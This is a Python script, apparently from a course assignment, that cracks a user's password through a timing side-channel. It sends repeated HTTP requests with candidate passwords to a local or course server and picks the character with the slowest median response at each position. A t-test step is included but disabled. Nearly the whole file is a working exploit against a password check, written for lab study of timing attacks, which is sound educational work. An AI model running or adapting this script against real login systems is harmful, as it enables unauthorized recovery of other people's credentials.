import sys
import time
import requests # need to pipinstall this library
from statistics import median
from scipy.stats import ttest_ind # need to pip install this one too
import argparse

# sites to test
# http://127.0.0.1
# http://aoi-assignment1.oy.ne.ro:8080


SERVER_URL = "http://127.0.0.1"
RETRIES = 10      # number of measurements per character (we take the median)
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"

def eprint(*args, **kwargs):
    # helper function to print to stderr instead of stdout
    print(*args, file=sys.stderr, **kwargs)

def measure_single_request(url):
    """
    Sends a single request to the server and measures its response time.
    """
    try:
        start = time.time()
        requests.get(url)
        end = time.time()
        return end - start
    except requests.exceptions.RequestException:
        return float("inf")  

def measure_time_for_character(server_url, username, candidate, retries):
    """
    Measures the median response time for a single candidate password using sequential requests.
    """
    url = f"{server_url}/?user={username}&password={candidate}&difficulty=1"
    timings = []

    for _ in range(retries):
        result = measure_single_request(url)
        if result != float("inf"):  # ignore failed requests
            timings.append(result)

    return timings

def find_password_length(server_url, username):
    """
    Determines the password length based on response times.
    """
    eprint("Determining password length...")
    base_password = "a"

    max_time = 0
    max_length = 0
    for length in range(1, 33):  # test lengths up to 32
        test_password = base_password * length 
        med_time = median(measure_time_for_character(server_url, username, test_password, RETRIES))
        eprint(f"Length {length}, median time: {med_time:.5f}s")

        if med_time > max_time:  
            max_time = med_time
            max_length = length
    
    return max_length

def find_password(server_url, username, length):
    """
    Finds the password by exploiting response times.
    """
    eprint(f"Searching for password of length {length}...")
    password = ""

    for position in range(length):
        max_time = 0
        best_char = ""
        ttest_flag = False

        group_not_likely = [] #groups for ttest, (not used in Milestone 1)
        group_likely = []

        for char in CHARACTERS:
            candidate = password + char + "a" * (length - len(password) - 1)
            eprint(f"Testing '{candidate}' at position {position}...")

            time_list = measure_time_for_character(server_url, username, candidate, RETRIES)

            group_not_likely.extend(time_list)

            med_time = median(time_list)
            eprint(f"Character '{char}' median time: {med_time:.5f}s")

            if len(group_not_likely) >= 5 * RETRIES:
                group_likely = group_not_likely[-RETRIES:]
                group_not_likely = group_not_likely[:-RETRIES]

                t_stat, p_value = ttest_ind(group_not_likely, group_likely, equal_var=False)
                eprint(f"T-test p_value: {p_value:.5f}")

                # had to disable this because the server was giving such inconsistent response times, sometimes it 
                # would pick the wrong character simply because it all of a sudden took significantly longer than the ones before it
                # making it think that this is the character we should choose with p-value = 0.000 (even though it was not)
                if p_value < 0.0003 and med_time > max_time and False:
                    eprint(f"Found character by T-test at position {position}: '{char}' with median time {med_time:.5f}s")
                    password += char
                    max_time = med_time
                    best_char = char
                    eprint(f"Partial password: {password}")
                    ttest_flag = True
                    break

            if med_time > max_time:
                max_time = med_time
                best_char = char

        if ttest_flag:
            continue

        password += best_char
        eprint(f"Best character at position {position}: '{best_char}' with median time {max_time:.5f}s")
        eprint(f"Partial password: {password}")

    return password

def main():
    parser = argparse.ArgumentParser(description='Password cracker for Milestone 1')
    parser.add_argument('username', help='Username to crack password for')
    args = parser.parse_args()
    
    # find the password length
    #estimated_length = find_password_length(SERVER_URL, args.username)

    # find the password with the estimated length
   
    final_password = find_password(SERVER_URL, args.username, 16)
    print(final_password)  # only prints the password to stdout

if __name__ == "__main__":
    main()